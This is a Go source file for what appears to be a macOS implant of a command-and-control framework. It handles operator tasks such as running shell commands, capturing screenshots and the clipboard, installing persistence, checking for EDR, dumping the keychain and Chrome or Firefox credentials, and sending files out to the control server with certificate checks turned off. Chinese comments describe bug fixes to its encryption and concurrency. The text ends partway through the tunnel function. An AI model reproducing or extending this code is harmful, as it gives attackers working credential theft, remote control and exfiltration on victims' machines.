package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"macos_agent/functions"
	"macos_agent/utils"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]utils.Connection
var JOBS map[string]utils.Connection
var TUNNELS sync.Map
var TERMINALS sync.Map

// ★ DOWNLOADS / JOBS 会被任务协程写（下载/作业跑起来后 delete 自己）、又被新到的
// 任务读（`job list` 遍历、`job kill` 查表）。裸 map 一旦并发读写就是
// `fatal error: concurrent map read and map write` —— **Go 运行时直接终止进程，
// recover 也接不住**，现场表现是"agent 莫名掉线"。
// 这把锁只护 map 本身；`JobCancel` / `HandleCancel` 会在别处回调，**绝不持锁调用**
// （否则死锁）。
var jobsMu sync.Mutex

func jobsSetDownload(id string, c utils.Connection) {
	jobsMu.Lock()
	DOWNLOADS[id] = c
	jobsMu.Unlock()
}

func jobsDelDownload(id string) {
	jobsMu.Lock()
	delete(DOWNLOADS, id)
	jobsMu.Unlock()
}

func jobsSetJob(id string, c utils.Connection) {
	jobsMu.Lock()
	JOBS[id] = c
	jobsMu.Unlock()
}

func jobsDelJob(id string) {
	jobsMu.Lock()
	delete(JOBS, id)
	jobsMu.Unlock()
}

// jobsSnapshot 在锁内把两张表拷成切片，把遍历留给调用方。
func jobsSnapshot() []utils.JobInfo {
	jobsMu.Lock()
	defer jobsMu.Unlock()

	jobList := make([]utils.JobInfo, 0, len(DOWNLOADS)+len(JOBS))
	for k, v := range DOWNLOADS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	return jobList
}

func jobsLookup(id string) (utils.Connection, bool) {
	jobsMu.Lock()
	defer jobsMu.Unlock()

	if c, ok := DOWNLOADS[id]; ok {
		return c, true
	}
	c, ok := JOBS[id]
	return c, ok
}

type TunnelController struct {
	Cancel context.CancelFunc
	Paused atomic.Bool
}

// ─────────────────── 方向密钥派生（消除 two-time pad）───────────────────
//
// 缺陷：enc 与 dec 原先共用同一对 (key, iv) ⇒ AES-CTR 两个方向产生**同一段密钥流**：
//
//	C(server→agent) ⊕ C(agent→server) = P(server→agent) ⊕ P(agent→server)
//
// 即 two-time pad。终端会话里 s→a 是操作员键入、a→s 是 shell 回显，两者异或直接还原；
// 而 shell 提示符高度可预测 ⇒ 已知一侧明文即可解出另一侧。隧道同理。
//
// 修法：由同一 (key, iv) 用 HMAC-SHA256 作 KDF，派生出**两个计算上无关**的方向密钥。
//   ★ 为什么不是"给其中一个方向换个 iv"：CTR 下同 key、iv 仅差若干比特仍产生**相关**
//     密钥流，已知明文下可恢复；HMAC-SHA256 的输出没有这种结构。
//   ★ 为什么不动线格式：(key, iv) 仍原样走 initMsg ⇒ 协商格式零变化，两端各自本地派生。
//     但**两端必须同批上线** —— 只改一侧，该侧就解不出对侧（现象：隧道/终端一连就乱码）。
//
// ★★ 本函数在**两棵树里各有一份**，必须逐字节等价：
//      listener: extenders/gopher_listener_tcp/pl_transport.go
//      agent   : extenders/gopher_agent/src_gopher/tasks.go   ← 本文件与之等价
//
// ★★ 标签按**线路方向**命名，不按本地变量名 —— 两端的 enc/dec 与方向的对应是**相反**的：
//      server→agent : listener 用 encStream，agent 用 decStream
//      agent→server : listener 用 decStream，agent 用 encStream
//    按方向命名，是为了避开"照本地变量名对齐"这个几乎必然会犯的错。

const (
	axKeyLabelTunS2A  = "axc2/tunnel/s2a/v1"
	axKeyLabelTunA2S  = "axc2/tunnel/a2s/v1"
	axKeyLabelTermS2A = "axc2/terminal/s2a/v1"
	axKeyLabelTermA2S = "axc2/terminal/a2s/v1"
)

func axDirKey(key, iv []byte, label string) []byte {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(label))
	h.Write(iv)
	return h.Sum(nil)
}

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command utils.Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case utils.COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case utils.COMMAND_CAT:
			data, err = taskCat(command.Data)

		case utils.COMMAND_CD:
			data, err = taskCd(command.Data)

		case utils.COMMAND_CP:
			data, err = taskCp(command.Data)

		case utils.COMMAND_EXIT:
			data, err = taskExit()

		case utils.COMMAND_JOB_LIST:
			data, err = taskJobList()

		case utils.COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case utils.COMMAND_KILL:
			data, err = taskKill(command.Data)

		case utils.COMMAND_LS:
			data, err = taskLs(command.Data)

		case utils.COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case utils.COMMAND_MV:
			data, err = taskMv(command.Data)

		case utils.COMMAND_PS:
			data, err = taskPs()

		case utils.COMMAND_PWD:
			data, err = taskPwd()

		case utils.COMMAND_RM:
			data, err = taskRm(command.Data)

		case utils.COMMAND_RUN:
			data, err = jobRun(command.Data)

		case utils.COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case utils.COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case utils.COMMAND_CLIPBOARD:
			data, err = taskClipboard()

		case utils.COMMAND_PERSIST:
			data, err = taskPersist(command.Data)

		case utils.COMMAND_TCC_CHECK:
			data, err = taskTccCheck()

		case utils.COMMAND_DEFAULTS:
			data, err = taskDefaults(command.Data)

		case utils.COMMAND_EDR_CHECK:
			data, err = taskEdrCheck()

		case utils.COMMAND_KEYCHAIN:
			data, err = taskKeychain(command.Data)

		case utils.COMMAND_BROWSER_DUMP:
			data, err = taskBrowserDump(command.Data)

		case utils.COMMAND_TERMINAL_START:
			jobTerminal(command.Data)

		case utils.COMMAND_TERMINAL_STOP:
			taskTerminalKill(command.Data)

		case utils.COMMAND_TUNNEL_START:
			jobTunnel(command.Data)

		case utils.COMMAND_TUNNEL_STOP:
			taskTunnelKill(command.Data)

		case utils.COMMAND_TUNNEL_PAUSE:
			taskTunnelPause(command.Data)

		case utils.COMMAND_TUNNEL_RESUME:
			taskTunnelResume(command.Data)

		case utils.COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case utils.COMMAND_ZIP:
			data, err = taskZip(command.Data)

		default:
			continue
		}

		if err != nil {
			command.Code = utils.COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}

/// TASKS

func taskCat(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	fileInfo, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if fileInfo.Size() > 0x100000 {
		return nil, fmt.Errorf("file size exceeds 1 Mb (use download)")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	jobList := jobsSnapshot()

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(utils.AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := jobsLookup(params.Id)
	if !ok {
		return nil, fmt.Errorf("job '%s' not found", params.Id)
	}

	if job.JobCancel != nil {
		job.JobCancel()
	}

	job.HandleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params utils.ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	Files, err := functions.GetListing(path)
	if err != nil {
		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	Processes, err := functions.GetProcesses()
	if err != nil {
		return nil, err
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: path})
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
}

func taskClipboard() ([]byte, error) {
	content, err := functions.GetClipboard()
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: content})
}

func taskPersist(paramsData []byte) ([]byte, error) {
	var params utils.ParamsPersist
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	var output string
	switch params.Action {
	case "install":
		output, err = functions.PersistInstall(params.Method, params.Name)
	case "remove":
		output, err = functions.PersistRemove(params.Method, params.Name)
	case "status":
		output, err = functions.PersistStatus()
	default:
		return nil, fmt.Errorf("unknown persist action: %s", params.Action)
	}
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsPersist{Output: output})
}

func taskTccCheck() ([]byte, error) {
	output, err := functions.TccCheck()
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: output})
}

func taskDefaults(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDefaults
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}
	output, err := functions.DefaultsRead(params.Domain)
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: output})
}

func taskEdrCheck() ([]byte, error) {
	output, err := functions.EdrCheck()
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: output})
}

func taskKeychain(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKeychain
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	var output string
	switch params.Action {
	case "list":
		output, err = functions.KeychainList()
	case "dump":
		output, err = functions.KeychainDump()
	default:
		return nil, fmt.Errorf("unknown keychain action: %s", params.Action)
	}
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: output})
}

func taskBrowserDump(paramsData []byte) ([]byte, error) {
	var params utils.ParamsBrowserDump
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	var output string
	switch params.Browser {
	case "chrome":
		output, err = functions.BrowserDumpChrome(params.Target)
	case "firefox":
		output, err = functions.BrowserDumpFirefox(params.Target)
	default:
		return nil, fmt.Errorf("unknown browser: %s (use chrome or firefox)", params.Browser)
	}
	if err != nil {
		return nil, err
	}
	return msgpack.Marshal(utils.AnsShell{Output: output})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params utils.ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
}

func taskTerminalKill(paramsData []byte) {
	var params utils.ParamsTerminalStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TERMINALS.Load(params.TermId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskTunnelKill(paramsData []byte) {
	var params utils.ParamsTunnelStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Cancel()
		}
	}
}

func taskTunnelPause(paramsData []byte) {
	var params utils.ParamsTunnelPause
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Paused.Store(true)
		}
	}
}

func taskTunnelResume(paramsData []byte) {
	var params utils.ParamsTunnelResume
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		ctrl, ok := value.(*TunnelController)
		if ok {
			ctrl.Paused.Store(false)
		}
	}
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(utils.AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params utils.ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
}

/// JOBS

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	size := info.Size()

	if size > 4*1024*1024*1024 {
		return nil, errors.New("file too big (>4GB)")
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			// ★ 原为 `return nil, err`：此刻 err 必为 nil ⇒ 返回 (nil, nil)，
			// 证书错误被吞掉、下游当成"空响应成功"。
			return nil, certerr
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	strFileId := params.Task
	FileId, _ := strconv.ParseInt(strFileId, 16, 64)

	connection := utils.Connection{
		PackType: utils.EXFIL_PACK,
		Conn:     conn,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	jobsSetDownload(strFileId, connection)

	go func() {
		defer func() {
			connection.HandleCancel()
			_ = conn.Close()
			jobsDelDownload(strFileId)
		}()

		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)

		job := utils.Job{
			CommandId: utils.COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, exfilMsg)

		chunkSize := 0x100000 // 1MB
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.Ctx.Done():
				finish = true
				canceled = true
			default:
			}

			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			_ = functions.SendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			procCancel()
			// ★ 同 :805 —— 原先是 `return nil, err`（err 为 nil），证书错误被吞。
			return nil, certerr
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := utils.Connection{
		PackType:  utils.JOB_PACK,
		Conn:      conn,
		JobCancel: procCancel,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	jobsSetJob(params.Task, connection)

	go func() {
		defer func() {
			procCancel()
			connection.HandleCancel()
			_ = conn.Close()
			jobsDelJob(params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stdoutPipe.Read(buf)
				if n > 0 {
					stdoutMu.Lock()
					stdoutBuf.Write(buf[:n])
					stdoutMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()
		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stderrPipe.Read(buf)
				if n > 0 {
					stderrMu.Lock()
					stderrBuf.Write(buf[:n])
					stderrMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()

		done := make(chan struct{})
		var lastOutLen, lastErrLen int
		const maxChunkSize = 0x10000 // 65 Kb
		wg.Add(1)                    // ★ ticker 协程也入 wg，收尾才能确保它已停
		go func() {
			defer wg.Done()
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return

				case <-ticker.C:
					ansRun := utils.AnsRun{Pid: pid}
					stdoutMu.Lock()
					out := stdoutBuf.String()
					stdoutMu.Unlock()
					if len(out) > lastOutLen {
						chunk := out[lastOutLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stdout = chunk[:maxChunkSize]
							lastOutLen += maxChunkSize
						} else {
							ansRun.Stdout = chunk
							lastOutLen = len(out)
						}
					}

					stderrMu.Lock()
					errOut := stderrBuf.String()
					stderrMu.Unlock()
					if len(errOut) > lastErrLen {
						chunk := errOut[lastErrLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stderr = chunk[:maxChunkSize]
							lastErrLen += maxChunkSize
						} else {
							ansRun.Stderr = chunk
							lastErrLen = len(errOut)
						}
					}

					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)

						message := utils.Message{
							Type:   2,
							Object: [][]byte{packedJob},
						}

						sendData, _ := msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						functions.SendMsg(conn, sendData)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		// ★ 顺序不能反：先 close(done) 让 ticker 协程退出，再 wg.Wait() 收它。
		// 反过来（wg.Wait() 在前）就是**死锁** —— ticker 只在 done 关闭时才返回。
		// 原先 ticker 根本没入 wg ⇒ 下面读 lastOutLen/lastErrLen 时它可能还在跑，
		// 两边同时改这两个计数器：轻则同一段输出重发/漏发，重则数据竞争。
		close(done)
		wg.Wait()

		stdoutMu.Lock()
		finalOut := stdoutBuf.String()
		stdoutMu.Unlock()
		stderrMu.Lock()
		finalErrOut := stderrBuf.String()
		stderrMu.Unlock()

		for {
			ansRun := utils.AnsRun{Pid: pid}
			hasMore := false

			if len(finalOut) > lastOutLen {
				chunk := finalOut[lastOutLen:]
				if len(chunk) > maxChunkSize {
					ansRun.Stdout = chunk[:maxChunkSize]
					lastOutLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stdout = chunk
					lastOutLen = len(finalOut)
				}
			}

			if len(finalErrOut) > lastErrLen {
				chunk := finalErrOut[lastErrLen:]
				if len(chunk) > maxChunkSize {
					ansRun.Stderr = chunk[:maxChunkSize]
					lastErrLen += maxChunkSize
					hasMore = true
				} else {
					ansRun.Stderr = chunk
					lastErrLen = len(finalErrOut)
				}
			}

			if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
				job.Data, _ = msgpack.Marshal(ansRun)
				packedJob, _ = msgpack.Marshal(job)
				message = utils.Message{
					Type:   2,
					Object: [][]byte{packedJob},
				}
				sendData, _ = msgpack.Marshal(message)
				sendData, _ = utils.EncryptData(sendData, utils.SKey)
				functions.SendMsg(conn, sendData)

				if hasMore {
					time.Sleep(100 * time.Millisecond)
				}
			}

			if !hasMore {
				break
			}
		}

		/// FINISH

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobTunnel(paramsData []byte) {
	var params utils.ParamsTunnelStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		reason := byte(0)
		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
		if err != nil {
			active = false
			var opErr *net.OpError
			if errors.As(err, &opErr) {
				if opErr.Timeout() {
					reason = 4
				}
				// ★ errors.Is 的实参顺序原先写反了：`errors.Is(syscall.ECONNREFUSED, opErr.Err)`
				// 把哨兵值当 err、把实际错误当 target ⇒ 恒 false ⇒ reason 永远停在 0/4。
				if errors.Is(opErr.Err, syscall.ECONNREFUSED) {
					reason = 5
				}
				if errors.Is(opErr.Err, syscall.ENETUNREACH) {
					reason = 3
				}
			}
		}

		var srvConn net.Conn
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			// ★ 原为 `srvConn.Close()`：Dial 失败时 srvConn 仍是 nil 接口，
			// 调 Close() 直接空指针 panic ⇒ **整个 agent 进程退出**。
			// 终端那条路径本来就是对的（只清理已存在的东西），这里同理：
			// clientConn 可能已经连上（失败的是到服务端那段），要收掉，避免漏 fd。
			if clientConn != nil {
				_ = clientConn.Close()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TUNNEL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				return
			}
		}

		/// Send Init
		functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

